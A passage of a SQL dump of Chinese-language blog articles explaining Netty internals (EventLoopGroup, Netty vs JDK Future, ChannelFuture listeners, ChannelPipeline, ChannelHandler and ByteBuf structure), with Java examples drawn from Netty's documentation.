EventLoopGroup为EventLoop添加线程终止监听器\n![eventLoopGroupAddterminationListener.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568296984_eventLoopGroupAddterminationListener.png)\n1. 在EventLoopGroup最后执行了部分操作\n1. 实例化线程工厂执行器选择器: 根据children的数量获取选择器\n2. 为每个EventLoop线程添加线程终止器\n3. 将children 添加到对应的set只读集合中去重\n\n### 总结\n![groupAndExecutorRelationship.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568300582_groupAndExecutorRelationship.png)\n#### NioEventLoopGroup创建时做了什么\n1. 获取JavaNio的selectorProvider *selectorProvide*\n2. 获取一个决定EventLoop的selector进行select()进行逻辑处理的策略对象工厂 *DefaultSelectStrategyFactory*\n3. 获取一个决定EventLoop的任务队列进行任务拒绝处理的处理器 *RejectedExecutionHandlers*\n4. 获取创建多少个EventLoop的数量,默认没有传值,则默认系统核心线程数*DEFAULT_EVENT_LOOP_THREADS*\n5. 获取一个对EventLoop进行负载均衡的选择器 *DefaultEventExecutorChooserFactory*\n6. 创建用来执行EventLoop的executor,采用了命令模式 ThreadPerTaskExecutor\n7. 对EventLoop进行创建 *children[i] = newChild(executor, args);*\n8. EventLoopGroup为EventLoop添加线程终止监听器 *terminationListener*\n9. 将所有EventLoop添加到对应的set只读集合中去重 *readonlyChildren*\n10. NioEventLoopGroup作用是完成一些变量的赋值,并没有做线程的开启等事情,就是做一些准备配置工作而已\n\n#### NioEventLoop创建时做了什么\n1. 将相关内容信息赋值,创建队列等\n2. 使用SelectorProvider创建selector,这证明NioEventLoopGroup中的每一个NioEventLoop都持有一个对应的selector\n3. NioEventLoop间接继承SingleThreadEventExecutor,这证明每一个NioEventLoop持有一个对应的thread对象', 1, 0, 40, 0, 0, '2019-09-12 16:18:20', '2019-09-13 16:35:27', 0, 0);
INSERT INTO `article` VALUES (80, 1, 'Netty的Future与JDK的Future', '2019/9/1568441326_mmexport1568440947604.jpg', '### JDK的Future\n#### JDK的Future概述\n1. 实际上封装了异步计算的结果,我们可以通过get方法来以阻塞的方式去获取这个异步调用的执行结果\n2. Future它代表的是封装一个异步的计算的结果,方法本身提供了若干个方法来去检查这个计算是不是已经完成,并且还会通过一些方法去等待计算的完成,并且还提供了若干个方法来去获取计算的结果\n3. 这个计算结果只能通过方法get来去获取到(当这个计算完成的时候),这个get方法会阻塞,直到计算完成为止.\n4. 取消操作是通过cancel方法来去完成的,除此之外,Future还提供了一些附加的方法来去确定任务是正常的完成了还是已经取消掉了;一旦计算完成的话,是不能取消的。\n5. 如果你希望使用Future针对于取消目的,然而没有提供一个可用的结果,那么你就可以声明Future返回一个null作为底层任务的结果\n6. Future是一个futurej计算异步的结果，异步的计算他动作一定发生在另外一个线程的Future.get的方法的结果之前 \n7. Future提供了许多的实现类便于操作,比如FutureTask\n\n#### JDK的Future方法\n1. **cancel(boolean mayInterruptIfRunning)**: 尝试去取消这个任务的执行,如果任务已经完成了或者已取消过或者处于其他某种原因不能被取消,这种尝试就会失败;如果取消操作成功的话,那么这个任务尚没有开始,则不可能运行run;如果任务已经启动了,那么mayInterruptIfRunning这个参数的设定是决定了这个执行任务的线程是不是可以被中断去停止这个任务,当这个方法返回的时候,后续的对于*isDone方法的调用总是会返回ture*,后续对*isCancel的方法也总是返回ture(如果这个方法本身也返回ture的话)*\n2. **isCancel()**: 如果取消成功,返回true\n3. **isDone()**: 如果任务完成,返回true,*计算由于正常的终止,异常,取消,在所有这些情况下这个方法都会返回true*\n4. **get()**: get方法来以阻塞的方式去获取这个异步调用的执行结果;*注意! 即使超时,任务也会继续执行*\n\n### Netty的Future\n#### Netty的Future概述\n1. 表示的是一个异步操作的结果,在jdk1.5的Future上又增加了若干个方法\n2. 它定义比JDK所提供的Future更加的细粒度,更加便于操作\n3. 它添加监听器回调这一方式,使得不需调用get阻塞等待结果\n\n#### Netty的Future方法\n1. *isDone()*: 如果任务完成,返回true,计算由于正常的终止,异常,取消,在所有这些情况下这个方法都会返回true\n2. *isSuccess()*: 仅仅当IO操作成功完成时,返回true 	\n3. *isCancellable()*: 仅仅当可以通过cancel取消操作时,返回true\n4. *cause()*: 如果I/O操作有失败了,则返回I/O操作失败的原因\n5. *sync()*: 同步等待这个future,直到它完成为止,如果这个future失败了,它会重新抛出失败的原因\n6. *await()*: 等待这个future完成\n7. *getNow()*: 在不阻塞的情况下直接返回这个结果,如果future尚未完成,那么这个方法返回null,一个null值被用于标识作为成功,你还要检查这个future是不是真的完成(通过isDone方法),不要依赖于返回的这个null值\n8. *addListener(GenericFutureListener)*: 向这个future去添加了指定的listener实例,指定的listener时当这个future的isDone方法完成的话,这个指定的listener就会收到通知,如果这个future已经完成的了,指定的listener就是立刻的通知到,应用了设计模式-观察者\n\n#### GenericFutureListener\n1. 监听着Future的执行结果,一但这个listener是通过调用Future#addListener之后,future的结果完成会调用listener的operationComplete(F future))\n2. GenericFutureListener的operationComplete()方法: 当与这个future相关的操作完成时,这个方法会被调用\n3. 这是一种事件驱动方式变成\n\n### Netty的ChannelFuture\n#### ChannelFuture概述\n1. 本身继承io.netty.util.concurrent.Future\n2. 它表示的是一个异步的channel io操作的结果\n3. netty当中的所有io操作都是异步的,这意味着任何io的调用都会立即地返回,所以并不能保证所请求的io操作在调用结束之后会完成;相反,你会得到一个*channelFuture*的实例,它会向你返回一些关于io操作的结果或者是状态的一些信息\n4. 本身Channelfuture提供了各种方法,让你去可以检查io是不是已经完成,还是在等待完成,并且可以获取到io操作的结果\n\n#### ChannelFuture状态标识\n1. 一个channelFuture要么是完成要么是未完成,当一个io操作开始的时候,会创建一个新的future对象,\n2. 这个新future一开始是没有完成的,它既不是成功,失败也不是取消的,因为这个io操作是尚未完成的\n3. 如果这个io操作完成了,要么是成功的完成,要么是失败的完成,要么是取消了,future就会被标识成完成了,并且会标识一些具体的信息,比如说失败的原因\n4. 请注意,甚至说失败和取消都属于完成的状态\n\n#### ChannelFuture状态标识过程\n1. *Uncompleted*: isDone=false, isSuccess()=false,  isCancelled()=false, cause()=null\n2. *Completed successfully*: isDone()=true,isSuccess()=true\n3. *Completed with failure*: isDone()=true,cause()=non-null\n4. *Completed by cancellation*: isDone()=true, isCancelled()=true\n\n#### ChannelFutureListener\n1. ChannelFuture可以让你添加*ChannelFutureListener*,这样的话,当你io操作完成时你就可以收到通知了\n2. *建议你使用addListener,而不是使用await方法,在任何情况下都这样推荐*\n3. addListener本身是一个非阻塞的方法,它仅仅是将指定的ChannelFutureListener添加到了ChannelFuture当中,当与之channelFuture关联的io操作完成时候,就会通知listener,而ChannelFutureListener,它会产生最好性能和资源利用率,因为它什么都不会阻塞\n4. 与之相反,await方法是一个阻塞的操作,一但被调用.调用者线程就会停下来直到操作完成,对于这个await方法来说,实现这种顺序的逻辑是容易,但是调用者线程会没必要的阻塞,直到io操作完成.成本是比较高,此外会有一种机会,导致在某些特定的环境下出现一种死锁的情况\n\n#### await造成的死锁\n1. 不要在channelHandler中调用await方法,ChannelHandler中的这些事件处理器方法,通常是会被IO线程所调用\n2. 如果await方法是在事件处理器当中所调用的,而这个事件处理器又是被IO线程所调用的,那么它所等待的IO操作就可能永远不会完成,因为await方法可能会阻塞它所等待的IO线程,造成死锁\n\n```java\n	// BAD - NEVER DO THIS\n    public void channelRead(ChannelHandlerContext ctx, Object msg) {\n        ChannelFuture future = ctx.channel().close();\n        future.awaitUninterruptibly();\n        // Perform post-closure operation\n        // ...\n    }\n\n	// GOOD\n    public void channelRead(ChannelHandlerContext ctx, Object msg) {\n        ChannelFuture future = ctx.channel().close();\n        future.addListener(new ChannelFutureListener() {\n            public void operationComplete(ChannelFuture future) {\n                // Perform post-closure operation\n                // ...\n            }\n        });\n    }\n```\n\n#### 等待超时\n1. 尽管上面提到这些缺陷,但在某些情况,我们去调用await方法会更加方便,这种情况下,请确保你不要在一个IO线程里面去调用await方法,否则就会出现一个BlockingOperationExcetpion 来防止死锁的发生\n2. *不要将IO超时和等待超时混为一谈*\n3. 你调用await(long),await(long, TimeUnit),awaitUninterruptibly(),awaitUninterruptibly(long,TimeUnit)方法所指定的超时值,它们与IO超时是没有任何关系的,如果一个IO超时,那么这个future会被标记为失败,比如说connectionTimeout,应该是通过一个特定于传输的选项来配置,以下举例例子\n\n```java\n  // BAD - NEVER DO THIS\n  Bootstrap b = ...;\n  ChannelFuture f = b.connect(...);\n  f.awaitUninterruptibly(10, TimeUnit.SECONDS);\n  if (f.isCancelled()) {\n      // Connection attempt cancelled by user\n  } else if (!f.isSuccess()) {\n      // You might get a NullPointerException here because the future\n      // might not be completed yet.\n      f.cause().printStackTrace();\n  } else {\n      // Connection established successfully\n  }\n\n	// GOOD\n    Bootstrap b = ...;\n    // Configure the connect timeout option.\n    b.option(ChannelOption.CONNECT_TIMEOUT_MILLIS,10000);\n    ChannelFuture f = b.connect(...);\n    f.awaitUninterruptibly();\n    // Now we are sure the future is completed.\n    assert f.isDone();\n    if(f.isCancelled()){\n        // Connection attempt cancelled by user\n    } else if(!f.isSuccess()){\n        f.cause().printStackTrace();\n    } else{\n        // Connection established successfully\n    } \n```\n\n### 总结\n#### Future\n1. Future是异步，提供中断、是否执行，是否完成\n2. Future是一个futurej计算异步的结果，异步的计算他动作一定发生在另外一个线程的Future.get的方法的结果之前，由于内存一致性所影响的\n\n#### ChannelFuture\n1. ChannelFuture 使用大量的事件监听器，是一个Channel异步IO的操作，而且Netty的所有IO都是异步的\n2. 一个ChannelFuture要么是完成与未完成状态，当I/O操作开始时，一个Future的创建，表示完成状态有失败与成功的返回\n3. ChannelFuture提供很多方法进行检测I/O,监控await不建议使用此方法，建议addListener方法，由于此方法是非阻塞\n4. 不要在ChannelHandler调用await方法，通常事件处理器方法被I/O的方法调用，await事件被的处理器调用的话，那么时间的处理被IO线程被调用的，那么等待的I/O操作就可能不会完成就可能造成死锁(**Do note confuse I/O timeout and await Timeout,意思就说不要把IO超时与await超时混在一谈**)\n\n#### Netty的Future与JDK的Future区别\n1. Netty的Future它是继承JDK的Future\n2. JDK的Future不知道什么时候调用Future.get()方法，Netty使用监听器解决这个问题，使用观察者模式,事件驱动方式\n3. Netty的Future提供可以调用性，可用性的问题进行改良,更加的细粒度', 1, 0, 38, 0, 0, '2019-09-14 14:08:55', '2019-10-16 21:26:21', 0, 0);
INSERT INTO `article` VALUES (81, 1, 'Netty的ChannelConfig与AttributeMap', '2019/9/1568451690_mmexport1568274296234.jpg', '### Channel概述\n#### channel是什么\n1. channel本身继承了AttributeMap, ChannelOutboundInvoker, Comparable<Channel>\n2. 它是一个对于网络socket的连接或者是一个组件,这个组件可以进行I/O操作,比如读,写,连接和绑定\n\n#### channel可以向用户提供如下的功能\n1. channel可以获取关于当前的状态(是否打开,是否连接)\n2. 提供了channel的配置参数ChannelOption,比如可接收的缓冲区大小\n3. 提供了channel所支持的I/O操作,比如读,写,连接和绑定\n4. 它向用户提供了一个ChannelPipeline,它可以处理与当前channel有关联的所有的事件和请求,它是将我们以及netty里面内置的若干个eventHandler有序组合,使得组合完毕后形成一个eventHandler的链表 \n,通过链表就可以逐个的去处理在当前的channel上面所产生的所有的IO事件以及用户发过来的请求\n\n#### 异步IO\n1. netty中所有的IO操作都是异步的,这意味着任何IO操作都会立即返回,完全不会保证所请求的IO操作在调用结束之后它已经完成了\n2. 相反,你会得到一个ChannelFuture实例,当所请求的IO操作无论成功失败或者取消都可以都通过channelFuture实例来拿到最后执行的结果\n\n#### channel是可继承的\n1. 一个channel可以拥有一个parent,这取决于这个channel是如何被创建的.\n2. 比如一个socketChannel它是被一个serverSocketChannel所接受的,它会将serverSocketChannel作为parent()的结果\n3. 这种层次化的语义是取决于channel传输的实现,你可以编写一个新的channel实现,让它去创建子channel,让它们共享一个socket连接,正如BEEP,SSH协议一样\n4. 向下转换,以去访问与特定的传输相关的操作,有一些传输会公开一些额外的操作,这种额外的操作是特定于传输的,这个时候就可以向下转换,将Channel转换成具体的子类型来去调用这种操作,比如老式IO数据报的传输的话,多个join/leave是由DatagramChannel来实现的\n\n#### 释放资源\n1. 释放资源非常重要,当你使用完所有channel之后,我们要调用close()或者closeChannelPromise()向所有资源释放,这种做法可以确保所有资源是以一种正确的方式得到了释放\n\n### ChannelOption与ChanneConfig\n#### ConstantPool\n1. 作为常量池,创建并且管理相关一些常量\n\n#### ChannelOption\n1. ChannelOption可以让我们去以一种类型安全的方式来去配置ChannelConfig,到底支持哪一种ChannelOption取决于ChannelConfig实际的实现,也可能依赖于它所属的传输层的本质\n2. 对于ChannelOption来说,主要配置一些关于底层的网络层里面的一些设置项\n3. 泛型T表示某一选项配置*值的类型*\n4. *主要作用: 用于存储关于TCP/IP相关的底层配置*\n5. *ChannelOption本身不维护值,而是维护Key的信息*\n\n#### ChannelConfig\n1. *维护ChannhelOption所对应的值*\n\n#### 关系\n```java\n// ChannelOption与ConstantPool关系\nConstantPool<ChannelOption<Object>> pool = new ConstantPool<ChannelOption<Object>>()\n\n// ChannelOption与ChannelConfig关系\nMap<ChannelOption<?>, Object> getOptions();\n```\n\n### AttributeMap,AttributeKey与Attribute\n#### AttributeMap\n1. 一个保存AttributeKey与Attribute的Map\n2. AttributeKey同样使用到了ContantPool\n3. 泛型T表示*值的类型*\n4. AttributeKey是key,Attribute是value,这个信息在AttributeMap放置在当中\n5. *主要作用: 自定义业务数据,在不同ChannelHandle获取业务数据*\n\n#### 关系\n```java\n// AttributeKey与ConstantPool关系\nConstantPool<AttributeKey<Object>> pool = new ConstantPool<AttributeKey<Object>>()\n// AttributeKey与Attribute关系\nAttributeMap<AttributeKey,Attribute>\n```\n\n### 总结\n#### ChannelOption与AttributeKey区别\n1. *ChannelOption*: 主要维护关于TCP/IP相关的底层配置,值在ChannelConfig的实现类*ServerSocketChannelConfig*维护\n2. *AttributeKey*: 主要维护业务数据,进行使用,值在channel的*AttributeMap*维护', 0, 0, 21, 0, 0, '2019-09-14 17:01:41', '2019-09-14 23:35:44', 0, 0);
INSERT INTO `article` VALUES (82, 1, 'Netty的ChannelPipeline与ChannelHandler', '2019/9/1568457371_mmexport1568274112355.jpg', '### ChannelPipeline概述\n#### ChannelPipeline是什么\n1. 它是一个接口,继承ChannelInboundInvoker,ChannelOutboundInovker,Iterable\n2. 它是ChannlerHandler的一个列表,它用于处理或拦截与Channel相关的所有进来事件以及出去的操作(入栈出栈两个方向)\n3. ChannelPipeline实现了一种高级的拦截过滤器模式的形式,目的是给用户完全控制事件的处理方式以及为ChannelPipeline中的ChildHandler进行彼此交互\n4. *相关于一个容器,存放若干个ChannelHandler对象(其实是ChannelHandlerContext)*\n5. *每一个channel都有它自己的pipeline*\n6. ChannelPipeline有数字进行标识出/入栈\n\n#### 初始化ChannelPipeline\n![newChannelPipeline.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568462705_newChannelPipeline.png)\n![newChannelPipeline2.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568462705_newChannelPipeline2.png)\n1. ChannelPipeline是当每个Channel新建的时候创建\n2. 是在AbstractChannel构造方法中创建\n3. DefaultChannelPipeline内部封装了一个channel对象,channel也可以访问到channelPipeline,它们互持有引用\n4. 通过链表的方式将TailContext和HeadContext链接起来,这证明ChannelPipeline本质上是链表的操作\n\n### ChannelHandler概述\n#### ChannelHandler是什么\n1. 用于处理处理I/O事件或拦截I/O操作的处理器\n2. 充当于Reactor模式中的*Concrete Event Handler(具体事件处理器)*\n3. ChannelHandler本身并没有提供很多方法，但你通常必须实现它的一个子类型 \n\n#### 子类型\n1. *ChannelInboundHandler*来处理入栈I/O事件,比如处理来自客户端请求\n2. *ChannelOutboundHandler*来处理出栈I/O操作,比如处理对客户端的响应\n3. 或者，为方便起见，提供以下适配器类\n4. *ChannelInboundHandlerAdapter*来处理入栈I/O事件\n5. *ChannelOutboundHandlerAdapter*来处理出栈I/O操作\n6. *ChannelDuplexHandler*来处理入栈和出栈事件\n\n#### 初始化ChannelHandler\n![newChannelHandler.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568464298_newChannelHandler.png)\n1. 在*ChannelInitializer*的实现类中*initChannel*方法中向ChannelPipeline中进行添加ChannelHandler\n2. 这些ChannelHandler中包含Netty所提供的ChannelHandler和我们所实现的ChannelHandler\n3. *initChannel(C ch)*: 注册channel后将调用此方法,当这个方法返回后,将从Channel的ChannelPipeline中删除调用此方法的实例,*每当有一个客户端连接新建Channel时就会调用一次*\n\n#### ChannelInitializer的作用\n![removeChannelInitializer.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568464298_removeChannelInitializer.png)\n1. 一个特殊的*ChannelInboundHandler*，它提供了一种在 *EventLoop*注册后初始化*Channel*的简便方法\n2. ChannelInitializer本身并不是ChildHandle的编写逻辑实现,而是起到一个封装的作用\n3. ChannelInitializer作用是用于通过initChannel这个方法一次性添加多个处理器\n\n#### Sharable注解作用\n1. 该注解标识*ChannelHandler相同的实例*可以多次添加到*一个或多个ChannelPipeline*\n2. 如果未指定此注解,每次将它添加到管道实例时,你必须创建新的ChannelHandler实例\n\n### ChannelHandlerContext概述\n#### ChannelHandlerContext是什么\n1. *ChannelHandler与channelPipeline之间交互的桥梁和纽带*\n2. 一个ChannelHandler可以通知ChannelPipeline当中的下一个channelHandler,并且还可以动态的修改ChannelHandler所属的ChannelPipeline\n3. 您可以通过调用*ChannelHandlerContext*其中一种方法通知同一*ChannelPipeline*中另一个最近的*ChannelHander*\n4. 您可以通过调用*ChannelHandler中pipeline*的方法去获取ChannelHandler所属的ChannelPipeline对象,应用可以在运行期间动态插入,删除或者替换ChannelPipeline当中的ChannleHandle\n5. 你可以去获取到一个*ChannelHandlerContext*作为成员变量供后续去使用,比如在ChannelHandler方法之外去触发一个事件,甚至说在不同线程当中去触发\n\n#### attr方法\n```java\n        AttributeKey<String> niubi = AttributeKey.valueOf(\"Hello\");\n        ctx.channel().attr(niubi).set(\"World\");\n        ctx.attr(niubi).set(\"Hello\"); // 4.1后被废弃\n```\n\n1. *attr方法*可以让你存储并且访问有状态的一些业务自定义信息,这些信息可能和ChannelHandler或者ChannelHandlerContext有关联的.请参考ChannelHandle来去了解各种推荐的方式来去管理有状态的一些信息\n2. 4.1前,只要有一个ChannelHandler,那么这个ChannelHandler就有一个与之对应的ChannelContext,如果有十个ChannelHandler,就会有十个ChannelContext,就会有十个不同的Map,用于分别存放这个ChannelHandler自己作用域里的KeyValue值,而Channel本身又有一个独立Map,这会导致作用域不同无法取值且容易被困扰\n3. 4.1后,只会有一个Map,这个Map会被Channel以及同Channel上面所有的ChannelHandler所共享,netty确保了键是不会重复\n\n#### 初始化ChannelHandlerContext\n![newChannelHandlerContext1.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568470093_newChannleHandlerContext1.png)\n![newChannelHandlerContext2.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568470276_newChannelHandlerContext2.png)\n1. *ChanneHandlerContext*是每次向*ChannelPipeline*添加*ChannelHandler*时创建的\n2. 是在*DefaultChannelPipeline的add..*等方法中创建的\n3. ChanneHandlerContext内部封装了一个ChannelHandler对象,ChanneHandlerContext是可以访问到ChannelHandler的,而ChannelHandler也可以使用*handlerAdded*添加ChanndlerHanderContext\n\n#### FastThreadLocal的使用\n![fasthreadlocal1.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568470276_fasthreadlocal1.png)\n![fastthreadlocal2.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568470276_fastthreadlocal2.png)\n![fastthreadlocal3.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568470276_fastthreadlocal3.png)\n1. 它是*ThreadLocal*的一种变种,它会产生更高的访问性能\n2. 在内部,*FastThreadLocal*会*使用常量的索引,而不会使用散列*.来去寻找变量,看上去性能变化很微小,但是它会稍微对性能有所改进相比与使用hashTable来说,而且在频繁访问的情况下是更加有用的\n3. 因为这个原因,要想充分利用线程本地变量这种优势的话,你的线程必须是一个FastThreadLocalThread或者是它的子类型,默认情况下.DefaultThreadFactory创建的所有线程都是FastThreadLocalThread\n4. 只能通过一个FastThreadLocalThread或子类进行,因为它需要一个特殊的字段来去存储一些必要的状态,通过其他的方式进行的访问都会退回到ThreadLocal\n\n#### 一个ChannelHandler可以有多个ChannelHandlerContext\n1. 一个ChannelHandler可以拥有多于一个的ChannelHandlerContext,通常情况下,一个ChannelHandler就对应一个ChannelHandlerContext,但有些情况下一个ChannelHandler是可以拥有多个ChannelHandlerContext对象\n2. 请注意,一个ChannelHandler实例可以被添加多次到ChannelPipeline当中,这意味着一个单个ChannelHandler实例可以拥有超过一个ChannelContext\n3. 因此这个单个的实例可以在不同的ChannelContext被调用,如果它被添加到ChannelPipeline当中超过一次,那么它就有了多个ChannelHandlerContext\n\n```java\n 	FactorialHandler fh = new FactorialHandler();\n        \n        ChannelPipeline p1 = ch.pipeline();\n        p1.addLast(\"f1\", fh);\n        p1.addLast(\"f2\", fh);\n\n        ChannelPipeline p2 = ch.pipeline();\n        p2.addLast(\"f3\", fh);\n        p2.addLast(\"f4\", fh); \n```\n1. 不同的ChannelHandlerContext被赋予\"f1\", \"f2\", \"f3\"和 \"f4\",*即使它们引用的是相同的ChannelHandler实例*\n\n### ChannelPipeline的出入栈\n```java\n *  +---------------------------------------------------+---------------+\n *  |                           ChannelPipeline         |               |\n *  |                                                  \\|/              |\n *  |    +---------------------+            +-----------+----------+    |\n *  |    | Inbound Handler  N  |            | Outbound Handler  1  |    |\n *  |    +----------+----------+            +-----------+----------+    |\n *  |              /|\\                                  |               |\n *  |               |                                  \\|/              |\n *  |    +----------+----------+            +-----------+----------+    |\n *  |    | Inbound Handler N-1 |            | Outbound Handler  2  |    |\n *  |    +----------+----------+            +-----------+----------+    |\n *  |              /|\\                                  .               |\n *  |               .                                   .               |\n *  | ChannelHandlerContext.fireIN_EVT() ChannelHandlerContext.OUT_EVT()|\n *  |        [ method call]                       [method call]         |\n *  |               .                                   .               |\n *  |               .                                  \\|/              |\n *  |    +----------+----------+            +-----------+----------+    |\n *  |    | Inbound Handler  2  |            | Outbound Handler M-1 |    |\n *  |    +----------+----------+            +-----------+----------+    |\n *  |              /|\\                                  |               |\n *  |               |                                  \\|/              |\n *  |    +----------+----------+            +-----------+----------+    |\n *  |    | Inbound Handler  1  |            | Outbound Handler  M  |    |\n *  |    +----------+----------+            +-----------+----------+    |\n *  |              /|\\                                  |               |\n *  +---------------+-----------------------------------+---------------+\n *                  |                                  \\|/\n *  +---------------+-----------------------------------+---------------+\n *  |               |                                   |               |\n *  |       [ Socket.read() ]                    [ Socket.write() ]     |\n *  |                                                                   |\n *  |  Netty Internal I/O Threads (Transport Implementation)            |\n *  +-------------------------------------------------------------------+\n```\n#### 入栈事件\n1. 入栈事件由入栈处理程序在自下而上的方向处理，如左侧所示图\n2. 入栈处理程序通常处理由底部的I/O线程生成的栈站数据图\n3. 通常通过实际输入操作从远程对等端读取入栈数据,如{@link SocketChannel #read（ByteBuffer）}\n4.  如果入站事件超出顶部入站处理程序，则会将其丢弃\n\n#### 出栈事件\n1. 出站事件由自上而下方向的出站处理程序处理，如右侧所示图\n2. 出站处理程序通常会生成或转换出站流量，例如写入请求\n3. 如果出站事件超出底部出站处理程序，则由与之关联的I/O线程处理\n4.  I/O线程经常执行实际的输出操作，例如{@link SocketChannel #write（ByteBuffer）}。\n\n#### 举出例子\n```java\n// 例如，我们假设我们创建了以下管道\n ChannelPipeline pipeline = ch.pipeline();\n p.addLast（“1”，new InboundHandlerA（））;\n p.addLast（“2”，new InboundHandlerB（））;\n p.addLast（“3”，new OutboundHandlerA（））;\n p.addLast（“4”，new OutboundHandlerB（））;\n p.addLast（“5”，new InboundOutboundHandlerX（））;\n\n// 在上面的示例中\n// 名称以{@code Inbound}开头的类表示它是入栈处理程序\n// 名称以{@code Outbound}开头的类表示它是出栈处理程序\n\n// 在给定的示例配置中\n// 当事件入栈时，处理程序评估顺序为1,2,3,4,5\n// 当活动出栈时，处理程序评估顺序为5,4,3,2,1\n\n// 3和4不实现{@link ChannelInboundHandler}，因此实际的入栈评估顺序将是1,2,5\n// 1和2不实现{@link ChannelOutboundHandler}，因此实际的出栈评估顺序将是5,4,3\n\n// 如果5实现{@link ChannelInboundHandler}和{@link ChannelOutboundHandler}\n// 入栈和出栈事件分别为125和543\n```\n\n#### 事件传播\n1. 正如您在图中所示，处理程序必须调用{@link ChannelHandlerContext}的事件传播方法\n2. 事件传播的方法在ChannelHandler中有详细说明\n\n```java\n// 以下示例显示了事件传播通常如何完成\npublic class MyInboundHandler extends {@link ChannelInboundHandlerAdapter} {\n    public void channelActive({@link ChannelHandlerContext} ctx) {\n        System.out.println(\"Connected!\");\n        ctx.fireChannelActive();\n    }\n}\n\npublic class MyOutboundHandler extends {@link ChannelOutboundHandlerAdapter} {\n    public void close({@link ChannelHandlerContext} ctx, {@link ChannelPromise} promise) {\n        System.out.println(\"Closing ..\");\n        ctx.close(promise);\n    }\n}\n```\n#### 创建管道\n```java\n// 用户应该在管道中有一个或多个ChannelHandler来接收I/O事件例如读取和请求I/O操作（例如写入和关闭).例如，典型的服务器将具有以下处理程序\n// 在每个频道的管道中，但您的里程可能会根据其复杂性和特点而有所不同\n// 协议和业务逻辑\n// 协议解码器 - 将二进制数据（例如{@link ByteBuf}）转换为Java对象\n// 协议编码器 - 将Java对象转换为二进制数据。\n// 业务逻辑处理程序 - 执行实际业务逻辑（例如数据库访问）。\n\n// 它可以表示如下例所示\n\nstatic final EventExecutorGroup group = new DefaultEventExecutorGroup(16);\nChannelPipeline pipeline = ch.pipeline();\n\npipeline.addLast(\"decoder\", new MyProtocolDecoder());\npipeline.addLast(\"encoder\", new MyProtocolEncoder());\n\n// 告诉ChannelHandlerPipeline运行MyBusinessLogicHandler的事件处理程序方法\n// 在与I/O线程不同的线程中，以便I/O线程不被阻塞\n// 用于耗时任务\n// 如果您的业务逻辑完全异步或很快完成,则不需要指定一个线程组\npipeline.addLast(group, \"handler\", new MyBusinessLogicHandler());\n```\n#### 线程安全 \n1. 可以随时添加或删除ChannelHandler，因为ChannelPipeline是线程安全的\n2. 例如，您可以在即将交换敏感信息时插入加密处理程序,交换后并将其删除\n\n### 总结\n![channelPipelineRelation.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568516207_channelPipelineRelation.png)\n1. 每一个Channel都会注册到特定的一个EventLoop上面\n2. 每一个Channel都会有一个ChannelPipeline与之对应,它们互持有引用,并且这种关联关系在整个Channel生命周期当中是不会发生改变的,channel一旦绑定到了某个channelPipeline上面,它就不可能再去绑定到其他的channelPipeline上面,它们之间是一对一的映射关系\n3. ChannelPipeline当中存放的是若干个ChannelHandlerContext对象,而ChannelHandleContext里面是可以引用到对应的ChannelHande这个处理器对象的,这样就建立好了组件的关联关系\n4. ChannelHandlerContext对象里面存放了我们所编写的或者netty内置所提供的ChannelHandle对象\n5. 因此ChannelPipeline当中实际真正存放的对象并不是ChannelHandle而是ChannelHandleContext\n6. 对于channelPipeline来说,它里面维护一个又一个的channelHandle,实际是由一个双向链表来构造的,来创建每一个channelHandle的同时,又会为它创建对应的channelHandlerContext对象,channelHandleContext对象是连接channelPipeline与channelHandle的桥梁和纽带\n7. ChannelHandle本身分为两个方向的,一个Inbound入栈,一个Outbound出栈,只处理符合本身职责的事件\n8. ChannelPipeline实现了高级拦截过滤器的管理', 1, 0, 50, 0, 0, '2019-09-14 18:36:18', '2019-09-16 13:59:20', 0, 0);
INSERT INTO `article` VALUES (83, 1, 'Netty的ByteBuf结构与类型', '2019/9/1568516584_mmexport1568440752529.jpg', '### ByteBuf概述\n#### ByteBuf是什么\n```java\n        ByteBuf buffer = Unpooled.buffer(10);\n        buffer.release();\n\n        for (int i = 0; i < 10; i++) {\n            buffer.writeByte(i);\n        }\n        for (int i = 0; i < buffer.capacity(); i++) {\n            System.out.println(buffer.getByte(i));\n        }\n```\n1. 零个或多个字节（八位字节）的随机和顺序可访问序列\n2. 与JavaNio的ByteBuffer相似,但是提供了额外的功能,更具有功能性和灵活性\n3. 建议创建一个新Buffer使用UnPooled中的一些辅助方法,而不要使用每一个具体实现的构造方法去创建\n\n### ByteBuf结构\n```java\n       +-------------------+------------------+------------------+\n       | discardable bytes |  readable bytes  |  writable bytes  |\n       |                   |     (CONTENT)    |                  |\n       +-------------------+------------------+------------------+\n       |                   |                  |                  |\n       0      <=      readerIndex   <=   writerIndex    <=    capacity\n```\n1. Bytebuf提供两个指针访问变量,来去支持顺序的读和写操作,这两个指针变量分别是*readrIndex*和*writerIndex*,初始值为0\n2. 如图展示一个Buff是如何被这*两个指针分成三个区域*\n3.  0      <=      readerIndex   <=   writerIndex    <=    capacity\n\n#### discardable bytes(可丢弃字节区域)\n1. 该段包含读操作已读取的字节\n2. 可丢弃字节区域是指:[0，readerIndex)之间的区域。可调用discardReadBytes()方法丢弃已经读过的字节\n3. 一开始长度是0,它的值会随着读操作不断执行而一直增加,最多增加到writeIndex位置,它不能超过writeIndex\n4. 被读取过字节是可以通过discardReadBytes方法被丢弃掉,然后去回收一个未使用的空间,这样可写入的字节就更多了\n\n#### readable bytes(可读字节区域)\n1.  此段是存储实际数据的位置\n2. 可读字节区域是指:[readerIndex, writerIndex)之间的区域。任何名称以read和skip开头的操作方法，都会改变readerIndex索引。\n3. 如果read操作的参数是一个ByteBuf的话,并且没有指定目标指针索引,那么被指定的ByteBuf的writeIndex也会相应的改变,也就是把当前ByteBuf读取到参数ByteBuf中,实际上是参数的ByteBuf上去写,写的同时就会让参数ByteBuf的writeIndex进行改变\n4. 如果没有足够的内容存在,再去读的话就会出现IndexOutOfBoundsException,对于新分配的或包装或拷贝的ByteBuf的readIndex默认值是0\n\n#### writable bytes(可写字节区域)\n1. 此段是未定义的空间,需要填写\n2. 